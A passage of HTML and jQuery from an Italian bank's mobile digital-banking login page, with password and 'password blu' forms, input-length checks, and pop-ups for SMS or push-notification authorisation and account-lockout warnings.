                                                <a href="javascript: void(0)" data-template="#button-btnAvantiPsw-ripristinaMT" id="avantiPsw-ripristinaMT" tabindex="-1" role="button" data-json-url="/pri/loginib/ripristinaSMSDaMT.action?nullnull">
                                                    <button id="btnAvantiPsw-ripristinaMT" type="button" tabindex="-1" class="btn btn-lg btn-primary" disabled="">
AVANTI
</button>
                                                </a>
                                            </div>
                                        </div>
                                        <div class="row" style="margin-top:20px;" tabindex="0" id="loginStepPassword5">
                                            <div class="col-md-24">
                                                <a id="linkAnnullaOperazione" href="https://digital.mps.it/pri/login/home_mobile.jsp#" onclick="location.reload();" title="Recupera password" class="mps_label dB_label_link">Annulla e torna alla Home Page</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <script>
                                //ENTER TO SUBMIT
                                document.getElementById("input-password-ripristinaMT")
                                    .addEventListener("keyup", function(event) {
                                        if (event.keyCode == 13 && $("#input-password-ripristinaMT").val().length == 8) {
                                            $("#avantiPsw-ripristinaMT").click();
                                        }
                                    });
                                //Controllo lunghezza Input			 
                                $("#input-password-ripristinaMT").keyup(function() {
                                    var ipt = $('#input-password-ripristinaMT').val();
                                    if (ipt.length < 1) {
                                        $('#pCheckMT').css('display', 'none');
                                        $('#pErrorMT').css('display', 'none');
                                        $('#btnAvantiPsw-ripristinaMT').prop("disabled", true);
                                        $('#avantiPsw-ripristinaMT').prop("tabindex", -1);
                                    } else if (ipt.length < 8) {
                                        $('#pCheckMT').css('display', 'none');
                                        $('#pErrorMT').css('display', 'block');
                                        $('#btnAvantiPsw-ripristinaMT').prop("disabled", true);
                                        $('#avantiPsw-ripristinaMT').prop("tabindex", -1);
                                    } else if ((ipt.length == 8) && ($.isNumeric(ipt))) {
                                        $('#pErrorMT').css('display', 'none');
                                        $('#pCheckMT').css('display', 'block');
                                        $('#btnAvantiPsw-ripristinaMT').prop("disabled", false);
                                        $('#avantiPsw-ripristinaMT').prop("tabindex", 0);
                                    } else {
                                        $('#pErrorMT').css('display', 'block');
                                        $('#pCheckMT').css('display', 'none');
                                        $('#btnAvantiPsw-ripristinaMT').prop("disabled", true);
                                        $('#avantiPsw-ripristinaMT').prop("tabindex", -1);
                                    }
                                });


                                function open_win() {
                                    window.open('/pub/pb/aolInizio/action/pb/recuperaCredenzialiPasswordInit.action?sezId=nav_recupero_credenziali&pageId=nav_recupero_credenziali', '_blank');
                                }
                            </script>
                        </div>
                        <div id="includePswEnrolledBlue" class="margin_login_header includePswEnrolledBlue dB_box_container" style="display: none;">
                            <div id="login-enrolledBlu" tabindex="0">
                                <div class="mps_input_with_label_form">
                                    <div class="mps_form_container_centrale">
                                        <table class="db_marginTopBottom_header">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <h3>Accedi come <b></b></h3>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="row">
                                            <div class="col-md-6 db_colLabelCustom">
                                                <div class="mps_label_with_tooltip_container">
                                                    <label class="mps_label dB_label" "=" " for="input-psw-blu-enroll " style="float: left; ">Password blu</label>
<div class="mps_tooltip_white_background_red_bi dB_tooltip_margin " data-toggle="tooltip " title=" " data-original-title="Inserisci la password blu "></div>
</div>
</div>
<div class="col-md-13 db_colInputCustom mps_password_blu_container ">
<input type="tel " id="input-psw-blu-enroll " aria-required="true " class=" form-control mps_input mps_input_password_blu conceal " placeholder="Inserisci la password blu " maxlength="8 " onkeypress="return digitalBankingSCA.isNumberKey(event);
                                                        " autocomplete="off " autofocus=" "> <a id="pbCheck " class="wd_btn_showPassword " style="display: none; " tabindex="-1 " autocomplete="off ">
<div class="mps_approved_green dB_inputCheck "></div>
</a> <a id="pbError " class="wd_btn_showPassword " style="display: none; " tabindex="-1 ">
<div class="mps_not_approved_red dB_inputCheck "></div>
</a>
</div>
<div class="col-md-5 ">
<a href="javascript: void(0) " tabindex="0 " role="button " data-template="#button-btnEnrolledPswBlu " data-json-url="/pri/loginib/gestionePasswordBluTestMobileTokenSca.action?nullnull " id="AvantiEnrolledPswBlu ">
<button id="btnEntraEnrolledPswBlu " type="button " tabindex="-1 " class="btn btn-lg btn-primary " disabled=" ">
AVANTI
</button>
</a>
</div>
</div>
<div id="mostraCaptchaPswBlueRicorda " class="row " style="margin-top:20px; ">
<script type="widiba-template/text " id="idUno1 "></script>
<div class="col-md-24 form-group mps_input_with_label_container ">
<div id="idCaptchaPSWBlueRicorda " class="wd_row wd_indent ">
<div id="recaptchaPSWBlueRicorda " name="recaptchaPSWBlueRicorda " align="center "></div>
</div>
</div>
</div>
<div id="linkRecuperaPswBluEnrolled " style="margin-top: 20px; " class="row ">
<div class="col-md-24 ">
<label class="mps_label dB_label ">Hai dimenticato la password blu?</label>
<a href="javascript: void(0) " title="Recupera password blu " class="mps_label dB_label_link dB_label_link_PwdBlu " data-template="#button-btnRecoverPswBlu ">Recupera password
blu</a>
</div>
</div>
<div id="linkRecuperaPswBluKOEnrolled " class="row " style="margin-top: 20px; display:none; ">
<div class="col-md-24 ">
<label class="mps_label dB_label ">Hai dimenticato la password blu?</label>
<a href="javascript: void(0) " title="Recupera password blu " class="mps_label dB_label_link " data-template="#button-btnRecoverPswBluKO ">Recupera password
blu</a>
</div>
</div>
</div>
</div>
</div>
<script>
	$(document).ready(function() {	
		
		if (document.getElementById("invioPswBluEnroll ").value == 'KO') {
			$("#linkRecuperaPswBluKOEnrolled ").show();
			$("#linkRecuperaPswBluEnrolled ").hide();
		} else {

			$("#linkRecuperaPswBluEnrolled ").show();
			$("#linkRecuperaPswBluKOEnrolled ").hide();
		}
	});

	//ENTER TO SUBMIT
	document.getElementById("input-psw-blu-enroll ").addEventListener(
			"keyup ",
			function(event) {
				if (event.keyCode == 13
						&& $("#input-psw-blu-enroll ").val().length == 8) {
					$('#AvantiEnrolledPswBlu').click();
				}
			});
	//Controllo lunghezza Input			 
	$("#input-psw-blu-enroll ").keyup(function() {
		var ipt = $("#input-psw-blu-enroll ").val();
		if (ipt.length < 1) {
			$('#pbCheck').css('display', 'none');
			$('#pbError').css('display', 'none');
			$('#btnEntraEnrolledPswBlu').prop("disabled ", true);
			$('#AvantiEnrolledPswBlu').prop("tabindex ",-1);
		} else if (ipt.length < 8) {
			$('#pbCheck').css('display', 'none');
			$('#pbError').css('display', 'block');
			$('#btnEntraEnrolledPswBlu').prop("disabled ", true);
			$('#AvantiEnrolledPswBlu').prop("tabindex ",-1);
		} else if ((ipt.length == 8) && ($.isNumeric(ipt))) {
			$('#pbError').css('display', 'none');
			$('#pbCheck').css('display', 'block');
			$('#btnEntraEnrolledPswBlu').prop("disabled ", false);
			$('#AvantiEnrolledPswBlu').prop("tabindex ",0);
		} else {
			$('#pbError').css('display', 'block');
			$('#pbCheck').css('display', 'none');
			$('#btnEntraEnrolledPswBlu').prop("disabled ", true);
			$('#AvantiEnrolledPswBlu').prop("tabindex ",-1);
		}
	});
	
	$('#forcetokencollaudoPWBLUEnroll').on('ifChecked', function(event){
		$('#input-psw-blu-enroll').focus();
	});
</script>
</div>
<div id="includePopupEnroll ">
<div id="popUp " style="text-align:center!important ">
<div id="popupEnroll " class="popupOverlayFunnel tabNavigationPopup " style="display: none; " tabindex="0 " aria-label="Finestra di Autorizzazione dispositivi ">
<div class="mps_modal_container ">
<div id="modalExample " tabindex="0 " role="dialog " class="firstElementPopup " aria-labelledby="bodyPopup " aria-hidden="true ">
<div class=" modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">Autorizzazione dispositivi</h5>
</div>
<div id="bodyPopup " class="modal-body ">Autorizza questo dispositivo e dal prossimo accesso inserisci solo la tua password per entrare in Digital Banking.<br>Per maggiori informazioni visita la pagina <a href="https://digital.mps.it/pri/login/home_mobile.jsp#
                                                        " onclick="window.open( 'https://www.mps.it/sicurezza/Pagine/default.aspx', '_system'); ">Sicurezza</a>.</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnAnnullaLoginEnrolled " data-content="#popupDeviceEnrollment ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">Annulla
</button>
</a>
</div>
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnConfirmiLoginEnrolled " data-json-url="/pri/loginib/checkNumeroTentativiMobileTokenJSON.action?nullnull " data-content="#popupDeviceEnrollment " data-device-enroll=" ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn btn-popup btn-primary dB_btn_popUp right fix lastElement ">Conferma</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popupOTP " class="popupOverlayFunnel tabNavigationPopup " style="display: none; " tabindex="0 ">
<div class="mps_modal_container ">
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 id="titleOTP " class="modal-title popTitle ">Recupera Codice</h5>
</div>
<div class="modal-body " id="textOTP ">
Se non hai ricevuto l'SMS che ti abbiamo inviato, puoi richiederne uno nuovo.<br>
Assicurati di inserire il Codice di Conferma ricevuto nell'ultimo SMS.
</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnCloseRecoverCodConferma " data-content="#popupOTP ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">Annulla
</button>
</a></div><a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnCloseRecoverCodConferma " data-content="#popupOTP ">
</a><div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% "><a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnCloseRecoverCodConferma " data-content="#popupOTP ">
</a>
<a id="nuovaNotificaSMS " href="javascript: void(0) " tabindex="-1 " data-template="#button-btnConfirmiRetrievePsw " data-json-url="/pri/loginib/generateOptPostPWPopupMobileTokenScaJSON.action " data-content="#popupDeviceEnrollment
                                                        " data-device-enroll=" ">
<button id="buttonOTP " type="button " tabindex="0 " role="button " class="btn-responsive btn btn-primary btn-popup dB_btn_popUp right fix lastElement ">RIMANDAMI L'SMS</button>
</a>
<a id="nuovaNotificaMT " style="display:none " href="javascript: void(0) " tabindex="-1 " data-template="#button-checkTentativiMT " data-json-url=" /pri/loginib/checkTentativiMtJSON.action?nullnull ">
<button type="button " id="buttonSubmitRipeti " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix lastElement " data-dismiss="modal ">Rimanda nuova notifica
</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="row " id="linkLandingPageMT " style="display:none ">
<div class="col-24 form-group mps_input_with_label_container smallPhones ">
<div class="dB_icon_link_container " style="float: left; ">
<a class="dB_link_with_icon lastElement " tabindex="0 " href="https://digital.mps.it/pri/login/home_mobile.jsp# " onclick="open_infoMT() " title="Non ricevi le notifiche? Hai bisogno di aiuto? ">
<h4 style="text-transform: none !important ">Non ricevi le notifiche? Hai bisogno di aiuto?</h4>
</a>
</div>
</div>
</div>
</div>
<div id="popupPswBlu " class="popupOverlayFunnel tabNavigationPopup " style="display: none; " tabindex="0 ">
<div class="mps_modal_container ">
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">Recupera password
blu
</h5>
</div>
<div class="modal-body ">
La Password Blu è la password che ti abbiamo inviato via SMS al numero di cellulare che hai indicato.<br>
<p id="avalonMessage ">Attenzione puoi richiederla una sola volta.</p>
<p id="prospectMessage ">Attenzione puoi richiederla fino ad un massimo di cinque volte.</p>
</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnCloseRecoverPswBlu " data-content="#popupPswBlu ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">Non rimandarmela
</button>
</a>
</div>
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnConfirmiRetrievePswBlu " data-json-url="/pri/loginib/invioNuovaPswBluMobileToken.action?nullnull " data-content="#popupDeviceEnrollment " data-device-enroll=" ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix lastElement ">Rimandamela</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popupPswBluKO " class="popupOverlayFunnel tabNavigationPopup " style="display: none; " tabindex="0 ">
<div class="mps_modal_container ">
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">Recupera password
Blu
</h5>
</div>
<div class="modal-body ">
<p id="MsgLimitAvalon ">Hai raggiunto il massimo numero di richieste della <span style="color: #0000C4 ">Password Blu</span> rivolgiti alla tua filiale.</p>
<p id="MsgLimitProspect ">Hai raggiunto il numero massimo di richieste della Password Blu, riprova dopo le ore 24.</p>
</div>
<div class="modal-footer ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnCloseRecoverPswBluKO " data-json-url="/pri/loginib/invioNuovaPswBlu.action?nullnull " data-content="#popupDeviceEnrollment " data-device-enroll=" ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix lastElement ">VA BENE, HO CAPITO</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popup5TentativiPswEnrolled " class="popupOverlayFunnel tabNavigationPopup " tabindex="0 " style="display: none; ">
<div class="mps_modal_container ">
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class=" modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">ATTENZIONE</h5>
</div>
<div class="modal-body ">
È il tuo ultimo tentativo per inserire le credenziali corrette. Se i dati saranno ancora errati la tua utenza verrà bloccata.<br> Per modificare le credenziali e riprovare ad accedere clicca sul pulsante INDIETRO.
</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnClosePopup5TentativiPswEnrolled " data-content="#popupPswBlu ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">INDIETRO</button>
</a>
</div>
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnConfermaTentativiPswEnrolled " data-content="#popupDeviceEnrollment " data-device-enroll=" ">
<button type="button " tabindex="0 " role="button " class=" btn-responsive btn btn-popup btn-primary dB_btn_popUp right fix lastElement ">CONFERMA</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popup5TentativiOTP " class="popupOverlayFunnel tabNavigationPopup " tabindex="0 " style="display: none; ">
<div class="mps_modal_container ">
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">ATTENZIONE</h5>
</div>
<div class="modal-body ">
È il tuo ultimo tentativo per inserire le credenziali corrette. Se i dati saranno ancora errati la tua utenza verrà bloccata.<br> Per modificare le credenziali e riprovare ad accedere clicca sul pulsante INDIETRO.
</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnClosePopup5TentativiOTP " data-content="#popupPswBlu ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">INDIETRO</button>
</a>
</div>
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnConfermaTentativiOTP " data-content="#popupDeviceEnrollment " data-device-enroll=" ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn btn-popup btn-primary dB_btn_popUp right fix lastElement ">CONFERMA</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popup5TentativiBluEnrolled " class="popupOverlayFunnel tabNavigationPopup " tabindex="0 " style="display: none; ">
<div class="mps_modal_container ">
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">ATTENZIONE</h5>
</div>
<div class="modal-body ">È il tuo ultimo tentativo per inserire le credenziali corrette. Se i dati saranno ancora errati la tua utenza verrà bloccata.<br> Per modificare le credenziali e riprovare ad accedere clicca sul pulsante INDIETRO.</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnClosePopup5TentativiPswBluEnrolled ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">INDIETRO</button>
</a></div><a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnClosePopup5TentativiPswBluEnrolled ">
</a><div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% "><a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnClosePopup5TentativiPswBluEnrolled ">
</a><a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnConfirmTentativiPwdBluEnrolled ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix lastElement ">CONFERMA</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popupNotificaMT " class="popupOverlay tabNavigationPopup " style="display: none; " tabindex="0 ">
<div class="mps_modal_container ">
<div class="modal-title modal-header ">
<h5 class="popTitle " style="padding-top: 10px;font-size: 20px; ">
Operazione in corso
</h5>
</div>
<div class="firstElementPopup " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class=" modal-dialog " role="document ">
<div class="modal-content lastElement " id="stepOne " tabindex="0 ">
<div class="row ">
<div class="col-md-24 " style="text-align: center; ">
<div class="row ">
<img style="margin-left:auto;margin-right:auto;height:300px " class="wd_img_push " src="/libs/img/pb/pub_assistenza_mobile_token.gif ">
</div>
<div class="row ">
<div class="modal-body ">
<b style="font-size:1.4rem!important ">Autorizza l'accesso sul tuo cellulare</b>
<p style="font-size:1.2rem!important; line-height:1.5!important " class="txtMobileToken ">Abbiamo inviato una <b>Notifica</b> sul tuo cellulare per autorizzare l'accesso al tuo Digital Banking.</p>
</div>
</div>
</div>
</div>
</div>
<div class="modal-content " id="stepTwo " style="display: none; ">
<div class="row ">
<div class="col-md-24 ">
<div class="row ">
<div class="modal-body ">
<div style="text-align: center; ">
<b style="font-size:1.4rem!important ">Non hai ancora autorizzato l’accesso sul tuo cellulare.</b>
<p style="font-size:1.2rem!important; line-height:1.5!important ">Se non hai ricevuto la <b>Notifica</b> che ti abbiamo inviato sul tuo cellulare, puoi richiederne una nuova. Assicurati di aprire l'ultima notifica ricevuta.</p>
</div>
</div>
</div>
<div class="row ">
<div class="col-md-8 form-group mps_input_with_label_container "></div>
<div class="col-md-8 form-group mps_input_with_label_container ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-checkTentativiMT " data-json-url=" /pri/loginib/checkTentativiMtJSON.action?nullnull ">
<button type="button " id="buttonSubmitRipeti " tabindex="0 " role="button " class="btn-responsive btn btn-primary " data-dismiss="modal ">Rimanda nuova notifica
</button>
</a>
</div>
<div class="col-md-8 form-group mps_input_with_label_container "></div>
</div>
<div class="row " style="padding: 1rem; border-top: 1px solid #e9ecef; ">
</div>
<div class="row ">
<div class="col-12 form-group mps_input_with_label_container smallPhones ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnAnnullaMT ">
<button type="button " id="buttonSubmitOfflineAnnulla " tabindex="0 " role="button " class="btn-responsive btn btn-outline-primary left " data-dismiss="modal ">Annulla
</button>
</a>
</div>
<div class="col-12 form-group mps_input_with_label_container smallPhones ">
<div class="dB_icon_link_container " style="float: right; ">
<a class="dB_link_with_icon lastElement " tabindex="0 " href="https://digital.mps.it/pri/login/home_mobile.jsp# " onclick="open_infoMT() " title="Non ricevi le notifiche? Hai bisogno di aiuto? ">
<h4 class="mps_bold " style="margin-left: 20px; ">Non ricevi le notifiche? Hai bisogno di aiuto?</h4>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popup5TentativiOTPMT " class="popupOverlayFunnel " style="display: none; ">
<div class="mps_modal_container ">
<div class=" " id="modalExample " tabindex="-1 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">ATTENZIONE</h5>
</div>
<div class="modal-body ">
È il tuo ultimo tentativo per inserire le credenziali corrette. Se i dati saranno ancora errati la tua utenza verrà bloccata.<br> Per modificare le credenziali e riprovare ad accedere clicca sul pulsante INDIETRO.
</div>
<div class="row ">
<div class="col-md-24 " style="padding-bottom: 20px ">
<a id="ripristnaMT " style="display: none " href="javascript: void(0) " class="mps_label dB_label_link " data-template="#button-btnRipristinaMT ">Non ricevi le
Notifiche? Ripristina l'SMS</a>
</div>
</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " data-template="#button-btnIndietroTentativi ">
<button type="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">INDIETRO</button>
</a>
</div>
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " data-template="#button-btnNuovaNotificaMT " data-content="#popupDeviceEnrollment " data-device-enroll=" ">
<button type="button " class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix ">CONFERMA</button>
</a>
</div>
</div>
<div class="row ">
<div class="col-24 form-group mps_input_with_label_container smallPhones ">
<div class="dB_icon_link_container " style="float: left; ">
<a class="dB_link_with_icon lastElement " tabindex="0 " href="https://digital.mps.it/pri/login/home_mobile.jsp# " onclick="open_infoMT() " title="Non ricevi le notifiche? Hai bisogno di aiuto? ">
<h4 style="text-transform: none !important ">Non ricevi le notifiche? Hai bisogno di aiuto?</h4>
</a>
</div>
</div>
</div>
<div class="row ">
<div class="col-md-24 " style="padding-bottom: 20px ">
<a id="ripristnaMT " style="display: none " href="javascript: void(0) " class="mps_label dB_label_link " data-template="#button-btnRipristinaMT ">Non ricevi le
Notifiche? Ripristina l'SMS</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popup5TentativiBluEnrolledMT " class="popupOverlayFunnel " style="display: none; ">
<div class="mps_modal_container ">
<div class=" " id="modalExample " tabindex="-1 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class="modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">ATTENZIONE</h5>
</div>
<div class="modal-body ">È il tuo ultimo tentativo per inserire le credenziali corrette. Se i dati saranno ancora errati la tua utenza verrà bloccata.<br> Per modificare le credenziali e riprovare ad accedere clicca sul pulsante INDIETRO.</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " data-template="#button-btnIndietroPopupTentativoPswBlu ">
<button type="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">INDIETRO</button>
</a></div><a href="javascript: void(0) " data-template="#button-btnIndietroPopupTentativoPswBlu ">
</a><div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% "><a href="javascript: void(0) " data-template="#button-btnIndietroPopupTentativoPswBlu ">
</a><a href="javascript: void(0) " data-template="#button-btnConfirmTentativiPwdBluEnrolled ">
<button type="button " class="btn-responsive btn-popup btn btn-primary dB_btn_popUp right fix ">CONFERMA</button>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="popup5TentativiPswSCA " class="popupOverlayFunnel tabNavigationPopup " tabindex="0 " style="display: none; ">
<div class="mps_modal_container ">
<div class=" " id="modalExample " tabindex="0 " role="dialog " aria-labelledby="modalExampleTitle " aria-hidden="true ">
<div class=" modal-dialog " role="document ">
<div class="modal-content ">
<div class="modal-header ">
<h5 class="modal-title popTitle ">ATTENZIONE</h5>
</div>
<div class="modal-body ">
È il tuo ultimo tentativo per inserire le credenziali corrette. Se i dati saranno ancora errati la tua utenza verrà bloccata.<br> Per modificare le credenziali e riprovare ad accedere clicca sul pulsante INDIETRO.
</div>
<div class="row ">
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
<a href="javascript: void(0) " tabindex="-1 " data-template="#button-btnClosePopup5TentativiPswSca " data-content="#popupPswBlu ">
<button type="button " tabindex="0 " role="button " class="btn-responsive btn-popup btn btn-outline-primary left " data-dismiss="modal ">INDIETRO</button>
</a>
</div>
<div class="col-md-12 form-group mps_input_with_label_container smallPhones " style="width: 50% ">
</div></div></div></div></div></div></div></div></div></div></div></div></div></div></body></html>